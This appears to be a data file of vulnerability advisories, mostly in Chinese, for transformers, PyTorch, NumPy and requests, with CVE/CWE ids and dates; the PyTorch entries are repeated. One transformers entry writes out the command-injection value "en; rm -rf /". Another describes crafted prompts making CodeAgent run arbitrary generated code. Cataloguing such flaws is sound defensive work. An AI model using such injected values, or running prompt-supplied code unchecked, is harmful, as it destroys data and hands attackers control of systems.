gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
gradio-app_gradio,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
gradio-app_gradio,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
gradio-app_gradio,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
gradio-app_gradio,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
